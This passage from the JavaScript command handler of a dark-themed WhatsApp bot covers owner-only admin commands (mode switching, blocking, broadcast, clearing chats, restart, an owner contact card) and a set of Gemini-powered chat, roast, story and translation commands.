  const yes = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const index = owner.indexOf(yes);

  if (index === -1)
    return Reply("⚠️ This number is not an Owner!");

  owner.splice(index, 1);
  fs.writeFileSync("./database/owner.json", JSON.stringify(owner, null, 2));

  Reply(`
⛧⋆━━━━━━━━━━━━⋆⛧
💀 𝖁𝕰ℂℕ𝔸 𝔻𝔼𝕃𝕰𝕿𝕰 𝕺𝖶𝕹𝕰𝖱 ☠️

👤 Removed Number: ${yes}
✔ Status: Success
⛧ Operator: 𝕁𝕀ℕ𝕏

🜚 _The shadows have erased the owner…_
⛧⋆━━━━━━━━━━━━⋆⛧
`);
}
break;

// ===================== PUBLIC MODE =====================
case "public": {
  if (!isCreator)
    return Reply("☠️ Only the Supreme Operator ☠️\n👑 *JINX* can use this command")

  if (raiden.public === true) {
    return raiden.sendMessage(
      m.chat,
      {
        text: "🌍 Bot is already in Public Mode",
        buttons: [
          { buttonId: `${prefix}self`, buttonText: { displayText: "🔒 Self Mode" }, type: 1 }
        ],
        footer: "© 𝕁𝕀ℕ𝕏🔥",
        headerType: 1
      },
      { quoted: lol }
    );
  }

  raiden.public = true;

  await raiden.sendMessage(
    m.chat,
    {
      text: `
⛧⋆━━━━━━━━━━━━⋆⛧
🌍 𝖁𝕰ℂℕ𝔸 𝕻𝖀𝕭𝕷𝕴ℂ 𝕸𝖔𝖉𝖊 ☠️

✔ Status: Public
✔ All Users can use this bot
⛧ Operator: 𝕁𝕀ℕ𝕏

🜚 _The bot is free to roam the shadows…_
⛧⋆━━━━━━━━━━━━⋆⛧
      `,
      buttons: [
        { buttonId: `${prefix}self`, buttonText: { displayText: "🔒 Self Mode" }, type: 1 }
      ],
      footer: "© 𝕁𝕀ℕ𝕏🔥",
      headerType: 1
    },
    { quoted: lol }
  );
}
break;

// ===================== SELF MODE =====================
case "self": {
  if (!isCreator)
    return Reply("☠️ Only the Supreme Operator ☠️\n👑 *JINX* can use this command")

  if (raiden.public === false) {
    return raiden.sendMessage(
      m.chat,
      {
        text: "🔒 Bot is already in Self Mode",
        buttons: [
          { buttonId: `${prefix}public`, buttonText: { displayText: "🌍 Public Mode" }, type: 1 }
        ],
        footer: "© 𝕁𝕀ℕ𝕏🔥",
        headerType: 1
      },
      { quoted: lol }
    );
  }

  raiden.public = false;

  await raiden.sendMessage(
    m.chat,
    {
      text: `
⛧⋆━━━━━━━━━━━━⋆⛧
🔒 𝖁𝕰ℂℕ𝔸 𝕾𝕰𝖫𝖥 𝕸𝖔𝖉𝖊 ☠️

✔ Status: Self
✔ Only Owner can use this bot
⛧ Operator: 𝕁𝕀ℕ𝕏

🜚 _The bot retreats into the shadows…_
⛧⋆━━━━━━━━━━━━⋆⛧
      `,
      buttons: [
        { buttonId: `${prefix}public`, buttonText: { displayText: "🌍 Public Mode" }, type: 1 }
      ],
      footer: "© 𝕁𝕀ℕ𝕏🔥",
      headerType: 1
    },
    { quoted: lol }
  );
}
break;

case "unblock-user":
case "unblock": {
if (!isCreator)
    return Reply("🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command")

  let user = m.mentionedJid[0] || m.quoted?.sender
  if (!user) return Reply("❌ Mention or reply a user to unblock")

  await raiden.updateBlockStatus(user, "unblock")

  Reply(`
╔══════════════════════╗
║ 🔓 USER UNBLOCKED
╠══════════════════════╣
║ 👤 User : @${user.split("@")[0]}
║ 🛡️ Status : Active
╚══════════════════════╝
`, { mentions: [user] })
}
break
case "block-user":
case "block": {
if (!isCreator)
    return Reply("🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command")

  let user = m.mentionedJid[0] || m.quoted?.sender
  if (!user) return Reply("❌ Mention or reply a user to block")

  await raiden.updateBlockStatus(user, "block")

  Reply(`
╔══════════════════════╗
║ 🔒 USER BLOCKED
╠══════════════════════╣
║ 👤 User : @${user.split("@")[0]}
║ 🛡️ Status : Blocked
║ ⚡ Action : Immediate
╚══════════════════════╝
`, { mentions: [user] })
}
break
case "broadcast":
case "bc": {
if (!isCreator)
    return Reply("🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command")
  if (!q) return Reply("❌ Text required")

  let chats = await raiden.chats.all()
  let success = 0

  for (let chat of chats) {
    if (chat.id.endsWith("@s.whatsapp.net")) {
      await raiden.sendMessage(chat.id, { text: q })
      success++
    }
  }

  Reply(`
╔══════════════════════╗
║ 📢 BROADCAST SENT
╠══════════════════════╣
║ 💬 Chats : ${success}
║ 🚀 Status : Success
╚══════════════════════╝
`)
}
break
case "clear-chats": {
  if (!isCreator)
    return Reply("🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command")

  let chats = await raiden.chats.all()
  for (let chat of chats) {
    await raiden.chatModify({ clear: true }, chat.id)
  }

  Reply(`
⛧⋆┈┈┈☽ 𝕍𝔼ℂℕ𝔸 𝕮𝕷𝔼𝔸ℝ ☾┈┈┈⋆⛧

🧹 𝕮𝕙𝕒𝕥𝕤 𝕊𝕦𝕔𝕔𝕖𝕤𝕤𝕗𝕦𝕝𝕝𝕪 𝕔𝕝𝕖𝕒𝕣𝕖𝕕

✅ Total chats removed: ${chats.length}

Operator: 𝕁𝕀ℕ𝕏
Entity: 𝖁𝕰ℂℕ𝔸

_The shadows are clean…_
`)
}
break
case "restart-bot":
case "restart": {
if (!isCreator)
    return Reply("🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command")

  Reply(`
╔══════════════════════╗
║ ♻️ BOT RESTARTING
╠══════════════════════╣
║ 🔄 Please wait...
╚══════════════════════╝
`)

  process.exit(0)
}

break
case "dev":
case "developer":
case "owner": {
  let nameown = `👑 𝙅𝙄𝙉𝙓 — 𝑽𝑬𝑪𝑵𝑨 𝘾𝙍𝙀𝘼𝙏𝙊𝙍`
  let NoOwn = `2348075997375`

  // 🔥 Stylish Intro Message Before Sending Contact
  await raiden.sendMessage(m.chat, {
    text: `
╔═══『 𝐕𝐄𝐂𝐍𝐀 𝐂𝐎𝐑𝐄 』═══╗
┃ 👑 *BOT OWNER CONTACT*
┃ ⚡ Creator of the VECNA System
┃ 🧠 Dark • Clean • Powerful
╚═══════════════════════╝
`.trim()
  }, { quoted: m })

  // 📇 Contact Card
  var contact = generateWAMessageFromContent(
    m.chat,
    proto.Message.fromObject({
      contactMessage: {
        displayName: nameown,
        vcard: `BEGIN:VCARD
VERSION:3.0
N:JINX;;;;
FN:${nameown}
ORG:⛧ VECNA SYSTEMS ⛧
TITLE:Bot Developer
item1.TEL;waid=${NoOwn}:+${NoOwn}
item1.X-ABLabel:WhatsApp
X-WA-BIZ-NAME:⛧ VECNA OFFICIAL ⛧
X-WA-BIZ-DESCRIPTION:Elite WhatsApp Bot Developer • Creator of VECNA Bot • Automation Specialist
END:VCARD`
      }
    }),
    {
      userJid: m.chat,
      quoted: m
    }
  )

  await raiden.relayMessage(
    m.chat,
    contact.message,
    { messageId: contact.key.id }
  )
}
break;


// ═══════════════════════════════════════════════
//  🤖 RIAS AI COMMANDS — Powered by Gemini
// ═══════════════════════════════════════════════

case "ask":
case "chat":
case "ai": {
    if (!q) return Reply(`🤖 Usage: ${prefix}ask [your question]\nOr type ${prefix}rias to start a full conversation!`);
    try {
        const ans = await riasGemini(q, "You are RIAS — sassy, confident, intelligent, mysterious. Created by Jinx Official. Reply in 1-4 sentences with emojis. Never be boring.");
        await raiden.sendMessage(m.chat, { text: `🤖 *𝗥𝗜𝗔𝗦 𝗔𝗜*\n\n${ans}\n\n_Powered by Gemini 🔴_` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "startchat":
case "riasc": {
    // Start a multi-turn conversation session
    const sessionKey = m.chat + ":" + sender;
    global.riasChatSessions = global.riasChatSessions || new Map();
    const greeting = await riasGemini(
        `The user ${pushname} just started a conversation with you. Greet them warmly but with your signature RIAS personality. Max 2 sentences.`,
        "You are RIAS — sassy, confident, mysterious WhatsApp AI. Created by Jinx Official."
    );
    const sent = await raiden.sendMessage(m.chat, {
        text: `🌹 *𝗥𝗜𝗔𝗦*\n\n${greeting}\n\n_Reply to this message to keep chatting. 💬_`
    }, { quoted: m });
    global.riasChatSessions.set(sessionKey, {
        history: [
            { role: "user",  parts: [{ text: `My name is ${pushname}. Let's chat.` }] },
            { role: "model", parts: [{ text: greeting }] },
        ],
        lastMsgId: sent?.key?.id || null,
        active: true
    });
}
break;

case "endchat": {
    const sessionKey = m.chat + ":" + sender;
    global.riasChatSessions = global.riasChatSessions || new Map();
    global.riasChatSessions.delete(sessionKey);
    Reply(`👋 *Chat ended.*\n\n_RIAS will be here when you need her. 🌹_\nType ${prefix}riasc to start again.`);
}
break;

case "roast": {
    const target = q || pushname;
    try {
        const roast = await riasGemini(`Roast "${target}" brutally, creatively and funny. Max 3 sentences. Be savage but not hateful.`, "You are RIAS, a savage witty roastmaster.");
        await raiden.sendMessage(m.chat, { text: `🔥 *𝗥𝗜𝗔𝗦 𝗥𝗢𝗔𝗦𝗧*\n\n${roast}\n\n_Consider yourself roasted. 🔴_` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "compliment": {
    const target = q || pushname;
    try {
        const comp = await riasGemini(`Give a genuine but slightly sarcastic compliment to "${target}". Max 2 sentences.`, "You are RIAS, confident and witty.");
        await raiden.sendMessage(m.chat, { text: `💐 *𝗥𝗜𝗔𝗦 𝗖𝗢𝗠𝗣𝗟𝗜𝗠𝗘𝗡𝗧*\n\n${comp}\n\n_From RIAS. That's rare. 🌹_` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "story": {
    if (!q) return Reply(`📖 Usage: ${prefix}story [your prompt]`);
    try {
        const story = await riasGemini(`Write a short dramatic story (4-5 sentences) about: ${q}`, "You are RIAS, a creative storyteller with dark, dramatic flair.");
        await raiden.sendMessage(m.chat, { text: `📖 *𝗥𝗜𝗔𝗦 𝗦𝗧𝗢𝗥𝗬*\n\n${story}\n\n_Written by RIAS. 🌹_` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "poem": {
    const topic = q || "power and darkness";
    try {
        const poem = await riasGemini(`Write a short dramatic poem (4-6 lines) about: ${topic}`, "You are RIAS, a poet with dark powerful themes.");
        await raiden.sendMessage(m.chat, { text: `🎭 *𝗥𝗜𝗔𝗦 𝗣𝗢𝗘𝗠*\n\n${poem}\n\n_— RIAS 🌹_` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "joke": {
    try {
        const joke = await riasGemini("Tell one clever, dark or witty joke. Max 3 sentences.", "You are RIAS, darkly funny.");
        await raiden.sendMessage(m.chat, { text: `😂 *𝗥𝗜𝗔𝗦 𝗝𝗢𝗞𝗘*\n\n${joke}\n\n_You're welcome. 🔴_` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "rizz": {
    try {
        const rizz = await riasGemini("Give one smooth, clever pickup line. Witty not cringe.", "You are RIAS, charismatic and confident.");
        await raiden.sendMessage(m.chat, { text: `🌹 *𝗥𝗜𝗔𝗦 𝗥𝗜𝗭𝗭*\n\n${rizz}\n\n_Use wisely. 🔴_` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "advice": {
    const topic = q || "life";
    try {
        const adv = await riasGemini(`Give bold, powerful, no-nonsense life advice about: ${topic}. Max 3 sentences.`, "You are RIAS, wise and confident.");
        await raiden.sendMessage(m.chat, { text: `🧠 *𝗥𝗜𝗔𝗦 𝗔𝗗𝗩𝗜𝗖𝗘*\n\n${adv}\n\n_You asked. I answered. 🔴_` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "translate": {
    const parts = q.split(" ");
    const lang  = parts[0] || "English";
    const text2 = parts.slice(1).join(" ");
    if (!text2) return Reply(`🌐 Usage: ${prefix}translate [language] [text]\nExample: .translate French Hello`);
    try {
        const translated = await riasGemini(`Translate this to ${lang}: "${text2}"`, "You are a translator. Only return the translation, nothing else.");
        await raiden.sendMessage(m.chat, { text: `🌐 *𝗧𝗥𝗔𝗡𝗦𝗟𝗔𝗧𝗜𝗢𝗡* → ${lang}\n\n${translated}` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "define": {
    if (!q) return Reply(`📖 Usage: ${prefix}define [word]`);
    try {
        const def = await riasGemini(`Define "${q}": part of speech, clear meaning, example sentence, synonyms. No markdown.`, "You are a concise dictionary.");
        await raiden.sendMessage(m.chat, { text: `📖 *𝗗𝗜𝗖𝗧𝗜𝗢𝗡𝗔𝗥𝗬*\n\n*Word:* _${q}_\n━━━━━━━━━━━━━━━\n${def}\n\n_RIAS knows everything. 🔴_` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "fact": {
    try {
        const fact = await riasGemini("Give one random, surprising and interesting fact. Max 2 sentences.", "You are a fact encyclopedia.");
        await raiden.sendMessage(m.chat, { text: `🌍 *𝗥𝗔𝗡𝗗𝗢𝗠 𝗙𝗔𝗖𝗧*\n\n${fact}\n\n_Mind blown? 🔴_` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "quote": {
    try {
        const qt = await riasGemini("Generate one powerful original quote. Under 2 sentences. Sign it as — RIAS", "You are RIAS, mysterious and powerful.");
        await raiden.sendMessage(m.chat, { text: `🌹 *𝗥𝗜𝗔𝗦 𝗤𝗨𝗢𝗧𝗘*\n\n"${qt}"\n\n_— RIAS 🔴_` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "improve": {
    const textToImprove = q || (m.quoted?.text || "");
    if (!textToImprove) return Reply(`✍️ Usage: ${prefix}improve [text] or reply to a message`);
    try {
        const improved = await riasGemini(`Rewrite and improve this text to sound more polished: "${textToImprove}"`, "You are a writing expert. No preamble, just the improved text.");
        await raiden.sendMessage(m.chat, { text: `✍️ *𝗜𝗠𝗣𝗥𝗢𝗩𝗘𝗗*\n\n${improved}` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

case "summarize": {
    const textToSum = q || (m.quoted?.text || "");
    if (!textToSum) return Reply(`📝 Usage: ${prefix}summarize [text] or reply to a message`);
    try {
        const summary = await riasGemini(`Summarize in clear bullet points: "${textToSum}"`, "You are a concise summarizer. Use • for bullets.");
        await raiden.sendMessage(m.chat, { text: `📝 *𝗦𝗨𝗠𝗠𝗔𝗥𝗬*\n\n${summary}` }, { quoted: m });
    } catch(e) { Reply("AI error: " + e.message); }
}
break;

    default:
        break;
    } // closes switch(command)

 } catch (err) {
console.log(require("util").format(err));
}
}

//~~~~~Status updated~~~~~//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file]
    require(file)
})
